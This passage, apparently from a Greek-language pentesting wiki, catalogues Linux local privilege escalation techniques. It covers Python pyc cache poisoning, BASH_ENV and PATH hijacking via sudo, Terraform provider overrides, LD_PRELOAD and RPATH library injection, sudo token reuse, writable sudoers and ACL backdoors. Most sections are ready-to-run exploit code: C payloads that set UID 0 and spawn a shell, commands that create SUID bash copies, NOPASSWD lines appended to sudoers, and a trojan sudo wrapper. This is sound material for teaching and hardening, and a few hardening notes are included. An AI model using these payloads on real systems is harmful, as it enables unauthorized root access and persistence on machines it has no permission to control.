- Αν μπορείτε να **διαγράψετε και να δημιουργήσετε ξανά** το cached file επειδή ο κατάλογος είναι writable, ένα root-owned αλλά non-writable `.pyc` μπορεί και πάλι να αντικατασταθεί.
- Τυπική διαδρομή:
- Το `sudo -l` εμφανίζει ένα Python script ή wrapper που μπορείτε να εκτελέσετε ως root.
- Αυτό το script κάνει import ένα local module από `/opt/app/`, `/usr/local/lib/...` κ.λπ.
- Ο κατάλογος `__pycache__` του imported module είναι writable από τον χρήστη σας ή από όλους.

Γρήγορη enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Εάν μπορείτε να επιθεωρήσετε το privileged script, εντοπίστε τα imported modules και τη διαδρομή cache τους:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Ροή εκμετάλλευσης:

1. Εκτελέστε μία φορά το script που επιτρέπεται μέσω sudo, ώστε η Python να δημιουργήσει το νόμιμο αρχείο cache, αν δεν υπάρχει ήδη.
2. Διαβάστε τα πρώτα 16 bytes από το νόμιμο `.pyc` και χρησιμοποιήστε τα ξανά στο poisoned αρχείο.
3. Κάντε compile ένα payload code object, εφαρμόστε `marshal.dumps(...)` σε αυτό, διαγράψτε το αρχικό αρχείο cache και δημιουργήστε το ξανά με το αρχικό header και το malicious bytecode.
4. Εκτελέστε ξανά το script που επιτρέπεται μέσω sudo, ώστε το import να εκτελέσει το payload ως root.

Σημαντικές σημειώσεις:

- Η επαναχρησιμοποίηση του αρχικού header είναι κρίσιμη, επειδή η Python ελέγχει τα metadata του cache σε σχέση με το source file και όχι αν το σώμα του bytecode ταιριάζει πραγματικά με το source.
- Αυτό είναι ιδιαίτερα χρήσιμο όταν το source file ανήκει στον root και δεν είναι writable, αλλά ο φάκελος `__pycache__` που το περιέχει είναι writable.
- Η επίθεση αποτυγχάνει αν η privileged process χρησιμοποιεί `PYTHONDONTWRITEBYTECODE=1`, αν γίνεται import από τοποθεσία με ασφαλή permissions ή αν αφαιρεθεί η write access από κάθε directory στο import path.

Ελάχιστη μορφή proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Βεβαιωθείτε ότι κανένας κατάλογος στο privileged Python import path δεν είναι writable από low-privileged users, συμπεριλαμβανομένου του `__pycache__`.
- Για privileged runs, εξετάστε τη χρήση του `PYTHONDONTWRITEBYTECODE=1` και περιοδικούς ελέγχους για μη αναμενόμενους writable καταλόγους `__pycache__`.
- Αντιμετωπίζετε τα writable local Python modules και τους writable cache directories με τον ίδιο τρόπο όπως τα writable shell scripts ή τις shared libraries που εκτελούνται από τον root.

### BASH_ENV preserved via sudo env_keep → root shell

Αν το sudoers διατηρεί το `BASH_ENV` (π.χ. `Defaults env_keep+="ENV BASH_ENV"`), μπορείτε να αξιοποιήσετε τη non-interactive startup behavior του Bash για να εκτελέσετε arbitrary code ως root κατά την invocation μιας επιτρεπόμενης εντολής.

- Γιατί λειτουργεί: Για non-interactive shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source αυτό το αρχείο πριν εκτελέσει το target script. Πολλοί sudo rules επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Αν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας γίνεται source με root privileges.

- Απαιτήσεις:
- Ένας sudo rule που μπορείτε να εκτελέσετε (οποιοσδήποτε target που κάνει invoke το `/bin/bash` non-interactively ή οποιοδήποτε bash script).
- Το `BASH_ENV` να υπάρχει στο `env_keep` (ελέγξτε το με `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Αφαιρέστε τα `BASH_ENV` (και `ENV`) από το `env_keep`, προτιμήστε το `env_reset`.
- Αποφύγετε shell wrappers για εντολές που επιτρέπονται μέσω sudo· χρησιμοποιήστε minimal binaries.
- Εξετάστε το ενδεχόμενο sudo I/O logging και alerting όταν χρησιμοποιούνται preserved env vars.

### Terraform μέσω sudo με διατηρημένο HOME (!env_reset)

Αν το sudo αφήνει το environment ανέπαφο (`!env_reset`) ενώ επιτρέπει το `terraform apply`, το `$HOME` παραμένει αυτό του χρήστη που εκτελεί την εντολή. Επομένως, το Terraform φορτώνει το **$HOME/.terraformrc** ως root και τηρεί το `provider_installation.dev_overrides`.

- Κατευθύνετε τον απαιτούμενο provider σε έναν writable directory και τοποθετήστε ένα malicious plugin με όνομα ίδιο με αυτό του provider (π.χ. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Το Terraform θα αποτύχει κατά το Go plugin handshake, αλλά θα εκτελέσει το payload ως root πριν τερματιστεί, αφήνοντας πίσω ένα SUID shell.

### Παράκαμψη TF_VAR overrides + symlink validation

Οι μεταβλητές του Terraform μπορούν να παρέχονται μέσω environment variables `TF_VAR_<name>`, οι οποίες διατηρούνται όταν το sudo διατηρεί το environment. Αδύναμοι έλεγχοι, όπως `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, μπορούν να παρακαμφθούν με symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Το Terraform επιλύει το symlink και αντιγράφει το πραγματικό `/root/root.txt` σε έναν προορισμό αναγνώσιμο από τον attacker. Η ίδια προσέγγιση μπορεί να χρησιμοποιηθεί για **εγγραφή** σε privileged paths, με την εκ των προτέρων δημιουργία symlinks στον προορισμό (π.χ. με παραπομπή του destination path του provider μέσα στο `/etc/cron.d/`).

### requiretty / !requiretty

Σε ορισμένες παλαιότερες distributions, το sudo μπορεί να έχει ρυθμιστεί με `requiretty`, το οποίο επιβάλλει στο sudo να εκτελείται μόνο από ένα interactive TTY. Αν έχει οριστεί το `!requiretty` (ή η επιλογή απουσιάζει), το sudo μπορεί να εκτελεστεί από non-interactive contexts, όπως reverse shells, cron jobs ή scripts.
```bash
Defaults !requiretty
```
Αυτό δεν αποτελεί από μόνο του άμεση ευπάθεια, αλλά διευρύνει τις περιπτώσεις στις οποίες οι κανόνες `sudo` μπορούν να γίνουν αντικείμενο abuse χωρίς να απαιτείται πλήρες PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Αν το `sudo -l` εμφανίζει `env_keep+=PATH` ή ένα `secure_path` που περιέχει entries εγγράψιμα από τον attacker (π.χ. `/home/<user>/bin`), οποιαδήποτε relative εντολή μέσα στο sudo-allowed target μπορεί να γίνει shadowed.

- Απαιτήσεις: ένας κανόνας sudo (συχνά `NOPASSWD`) που εκτελεί ένα script/binary το οποίο καλεί εντολές χωρίς absolute paths (`free`, `df`, `ps`, κ.λπ.) και ένα writable PATH entry που αναζητείται πρώτο.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Παράκαμψη paths κατά την εκτέλεση με Sudo
**Μεταβείτε** για να διαβάσετε άλλα αρχεία ή να χρησιμοποιήσετε **symlinks**. Για παράδειγμα, στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Αν χρησιμοποιείται ένα **wildcard** (\*), είναι ακόμη πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Αντίμετρα**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary χωρίς path εντολής

Αν η **sudo permission** παρέχεται για μία μόνο εντολή **χωρίς να καθορίζεται το path**: _hacker10 ALL= (root) less_, μπορείτε να την εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** δυαδικό **εκτελεί μια άλλη εντολή χωρίς να καθορίζει τη διαδρομή προς αυτήν (να ελέγχετε πάντα με** _**strings**_ **το περιεχόμενο ενός περίεργου SUID δυαδικού)**.

[Παραδείγματα payload για εκτέλεση.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID δυαδικό με διαδρομή εντολής

Αν το **suid** δυαδικό **εκτελεί μια άλλη εντολή καθορίζοντας τη διαδρομή**, τότε μπορείτε να δοκιμάσετε να **εξαγάγετε μια function** με όνομα ίδιο με αυτό της εντολής που καλεί το αρχείο suid.

Για παράδειγμα, αν ένα suid δυαδικό καλεί το _**/usr/sbin/service apache2 start**_, πρέπει να δοκιμάσετε να δημιουργήσετε τη function και να την εξαγάγετε:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Στη συνέχεια, όταν εκτελέσετε το suid binary, αυτή η συνάρτηση θα εκτελεστεί

### Writable script executed by a SUID wrapper

Μια συνηθισμένη λανθασμένη ρύθμιση σε custom-app είναι ένα root-owned SUID binary wrapper που εκτελεί ένα script, ενώ το ίδιο το script είναι writable από low-priv χρήστες.

Τυπικό μοτίβο:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Αν το `/usr/local/bin/backup.sh` είναι εγγράψιμο, μπορείτε να προσθέσετε εντολές payload και, στη συνέχεια, να εκτελέσετε το SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Γρήγοροι έλεγχοι:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Αυτή η διαδρομή επίθεσης είναι ιδιαίτερα συνηθισμένη σε wrappers `"maintenance"`/`"backup"` που περιλαμβάνονται στο `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για τον καθορισμό μίας ή περισσότερων shared libraries (αρχεία .so) που θα φορτωθούν από τον loader πριν από όλες τις άλλες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading μιας βιβλιοθήκης.

Ωστόσο, για τη διατήρηση της ασφάλειας του συστήματος και την αποτροπή εκμετάλλευσης αυτής της δυνατότητας, ιδιαίτερα με executables **suid/sgid**, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:

- Ο loader αγνοεί το **LD_PRELOAD** για executables όπου το πραγματικό user ID (_ruid_) δεν ταιριάζει με το effective user ID (_euid_).
- Για executables με suid/sgid, γίνεται preload μόνο σε libraries που βρίσκονται σε standard paths και είναι επίσης suid/sgid.

Privilege escalation μπορεί να προκύψει αν έχετε τη δυνατότητα εκτέλεσης commands με `sudo` και η έξοδος του `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να παραμένει ενεργή και να αναγνωρίζεται ακόμη και όταν τα commands εκτελούνται με `sudo`, οδηγώντας δυνητικά στην εκτέλεση αυθαίρετου κώδικα με elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθηκεύστε ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Στη συνέχεια, **κάντε compile** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τέλος, **αυξήστε τα δικαιώματα** εκτελώντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ένα παρόμοιο privesc μπορεί να γίνει κατάχρηση αν ο attacker ελέγχει τη μεταβλητή περιβάλλοντος **LD_LIBRARY_PATH**, επειδή ελέγχει τη διαδρομή στην οποία θα αναζητηθούν οι libraries.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν εντοπίζετε ένα δυαδικό αρχείο με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να επαληθεύσετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει πιθανότητα exploitation.

Για να γίνει exploitation, θα πρέπει να δημιουργηθεί ένα αρχείο C, για παράδειγμα _"/path/to/.config/libcalc.c"_, το οποίο θα περιέχει τον ακόλουθο κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, αφού μεταγλωττιστεί και εκτελεστεί, επιδιώκει να κλιμακώσει τα δικαιώματα τροποποιώντας τα δικαιώματα αρχείων και εκτελώντας ένα shell με αυξημένα δικαιώματα.

Μεταγλωττίστε το παραπάνω αρχείο C σε ένα shared object (.so) με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεαζόμενου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας πιθανή παραβίαση του συστήματος.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που βρήκαμε ένα SUID binary που φορτώνει μια library από έναν φάκελο στον οποίο μπορούμε να γράψουμε, ας δημιουργήσουμε τη library σε αυτόν τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Αν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
αυτό σημαίνει ότι η βιβλιοθήκη που δημιουργήσατε πρέπει να περιέχει μια συνάρτηση που ονομάζεται `a_function_name`.

### GTFOBins

Το [**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα Unix binaries που μπορούν να αξιοποιηθούν από έναν attacker για την παράκαμψη τοπικών περιορισμών ασφαλείας. Το [**GTFOArgs**](https://gtfoargs.github.io/) είναι το αντίστοιχο για περιπτώσεις όπου μπορείτε να κάνετε **inject μόνο arguments** σε μια εντολή.

Το project συλλέγει νόμιμες λειτουργίες Unix binaries που μπορούν να χρησιμοποιηθούν καταχρηστικά για έξοδο από restricted shells, privilege escalation ή διατήρηση elevated privileges, μεταφορά αρχείων, δημιουργία bind και reverse shells, καθώς και για τη διευκόλυνση άλλων post-exploitation ενεργειών.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Αν μπορείτε να εκτελέσετε `sudo -l`, μπορείτε να χρησιμοποιήσετε το εργαλείο [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν εντοπίζει τρόπο εκμετάλλευσης κάποιου sudo rule.

### Επαναχρησιμοποίηση Sudo Tokens

Σε περιπτώσεις όπου έχετε **sudo access** αλλά όχι τον κωδικό πρόσβασης, μπορείτε να κάνετε privilege escalation **περιμένοντας την εκτέλεση μιας sudo εντολής και στη συνέχεια κάνοντας hijack το session token**.

Απαιτήσεις για privilege escalation:

- Έχετε ήδη ένα shell ως ο χρήστης "_sampleuser_"
- Ο "_sampleuser_" έχει **χρησιμοποιήσει το `sudo`** για να εκτελέσει κάτι **τα τελευταία 15 λεπτά** (από προεπιλογή, αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιούμε το `sudo` χωρίς να εισάγουμε κωδικό πρόσβασης)
- `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
- Το `gdb` είναι προσβάσιμο (θα πρέπει να μπορείτε να το ανεβάσετε)

(Μπορείτε να ενεργοποιήσετε προσωρινά το `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας το `/etc/sysctl.d/10-ptrace.conf` και ορίζοντας `kernel.yama.ptrace_scope = 0`)

Αν πληρούνται όλες αυτές οι απαιτήσεις, **μπορείτε να κάνετε privilege escalation χρησιμοποιώντας:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Το **πρώτο exploit** (`exploit.sh`) θα δημιουργήσει το binary `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για να **ενεργοποιήσετε το sudo token στο session σας** (δεν θα λάβετε αυτόματα root shell, εκτελέστε `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **με ιδιοκτήτη τον root και setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Το **third exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα sudoers file** που καθιστά τα **sudo tokens** αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν το sudo.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Αν έχεις **δικαιώματα εγγραφής** στον φάκελο ή σε οποιοδήποτε από τα δημιουργημένα αρχεία μέσα στον φάκελο, μπορείς να χρησιμοποιήσεις το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **δημιουργήσεις ένα sudo token για έναν χρήστη και ένα PID**.\
Για παράδειγμα, αν μπορείς να αντικαταστήσεις το αρχείο _/var/run/sudo/ts/sampleuser_ και έχεις ένα shell ως αυτός ο χρήστης με PID 1234, μπορείς να **αποκτήσεις sudo privileges** χωρίς να χρειάζεται να γνωρίζεις τον κωδικό πρόσβασης, εκτελώντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιεί το `sudo` και με ποιον τρόπο. Αυτά τα αρχεία **από προεπιλογή μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο, ενδέχεται να μπορείτε να **αποκτήσετε κάποιες ενδιαφέρουσες πληροφορίες**, και αν μπορείτε να **γράψετε** σε οποιοδήποτε αρχείο, θα μπορείτε να **κάνετε privilege escalation**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείτε να κάνετε εγγραφή, μπορείτε να κάνετε κατάχρηση αυτής της άδειας.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας ακόμη τρόπος κατάχρησης αυτών των δικαιωμάτων:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν ορισμένες εναλλακτικές του binary `sudo`, όπως το `doas` για το OpenBSD· θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Αν το `doas` επιτρέπει έναν editor ή interpreter, ελέγξτε escapes τύπου GTFOBins:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Αν γνωρίζετε ότι ένας **user συνδέεται συνήθως σε ένα machine και χρησιμοποιεί `sudo`** για την κλιμάκωση προνομίων και έχετε αποκτήσει ένα shell στο context αυτού του user, μπορείτε να **δημιουργήσετε ένα νέο sudo executable** που θα εκτελεί τον κώδικά σας ως root και έπειτα την εντολή του user. Στη συνέχεια, **τροποποιήστε το $PATH** του context του user (για παράδειγμα, προσθέτοντας το νέο path στο .bash_profile), ώστε όταν ο user εκτελεί το sudo, να εκτελείται το δικό σας sudo executable.

Σημειώστε ότι αν ο user χρησιμοποιεί διαφορετικό shell (όχι bash), θα χρειαστεί να τροποποιήσετε άλλα αρχεία για να προσθέσετε το νέο path. Για παράδειγμα, το [sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί τα `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε ένα ακόμη παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή εκτελώντας κάτι όπως:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Κοινόχρηστη Βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα αρχεία ρυθμίσεων που φορτώνονται**. Συνήθως, αυτό το αρχείο περιέχει την ακόλουθη διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι θα διαβαστούν τα αρχεία ρυθμίσεων από το `/etc/ld.so.conf.d/*.conf`. Αυτά τα αρχεία ρυθμίσεων **υποδεικνύουν άλλους φακέλους** στους οποίους θα πραγματοποιηθεί **αναζήτηση** για **libraries**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει libraries μέσα στο `/usr/local/lib`**.

Αν για οποιονδήποτε λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις υποδεικνυόμενες διαδρομές: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο που βρίσκεται μέσα στο αρχείο ρυθμίσεων του `/etc/ld.so.conf.d/*.conf`, ενδέχεται να μπορέσει να κάνει privilege escalation.\
Δείτε **πώς μπορείτε να εκμεταλλευτείτε αυτήν την εσφαλμένη ρύθμιση** στην ακόλουθη σελίδα:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Αντιγράφοντας το lib στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτήν την τοποθεσία, όπως καθορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια, δημιουργήστε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Τα Linux capabilities παρέχουν ένα **υποσύνολο των διαθέσιμων root privileges σε μια διεργασία**. Αυτό ουσιαστικά διασπά τα root **privileges σε μικρότερες και διακριτές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να εκχωρηθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο μειώνεται το πλήρες σύνολο των privileges, περιορίζοντας τους κινδύνους exploitation.\
Διαβάστε την ακόλουθη σελίδα για να **μάθετε περισσότερα σχετικά με τα capabilities και τον τρόπο abuse τους**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Permissions καταλόγων

Σε έναν κατάλογο, το **bit για "execute"** υποδηλώνει ότι ο χρήστης που επηρεάζεται μπορεί να κάνει "**cd**" στον φάκελο.\
Το bit **"read"** υποδηλώνει ότι ο χρήστης μπορεί να **κάνει list** των **files**, ενώ το bit **"write"** υποδηλώνει ότι ο χρήστης μπορεί να **διαγράφει** και να **δημιουργεί** νέα **files**.

## ACLs

Οι Access Control Lists (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο discretionary permissions, έχοντας τη δυνατότητα να **παρακάμπτουν τα παραδοσιακά ugo/rwx permissions**. Αυτά τα permissions ενισχύουν τον έλεγχο της πρόσβασης σε files ή directories, επιτρέποντας ή απαγορεύοντας δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι owners ή μέλη του group. Αυτό το επίπεδο **granularity εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες είναι διαθέσιμες [**εδώ**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** στον χρήστη "kali" permissions ανάγνωσης και εγγραφής σε ένα file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Λήψη** αρχείων με συγκεκριμένα ACL από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Κρυφό ACL backdoor σε sudoers drop-ins

Μια συνηθισμένη λανθασμένη ρύθμιση είναι ένα αρχείο ιδιοκτησίας `root` στο `/etc/sudoers.d/` με mode `440`, το οποίο εξακολουθεί να παρέχει δικαίωμα εγγραφής σε έναν low-priv χρήστη μέσω ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Αν δείτε κάτι όπως `user:alice:rw-`, ο χρήστης μπορεί να προσθέσει έναν κανόνα sudo παρά τα περιοριστικά mode bits:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Αυτή είναι μια διαδρομή persistence/privesc υψηλού αντίκτυπου μέσω ACL, επειδή είναι εύκολο να παραβλεφθεί σε ελέγχους που βασίζονται μόνο στο `ls -l`.

## Ανοιχτές shell sessions

Σε **παλιές εκδόσεις** μπορεί να **hijackάρεις** κάποια **shell** session διαφορετικού user (**root**).\
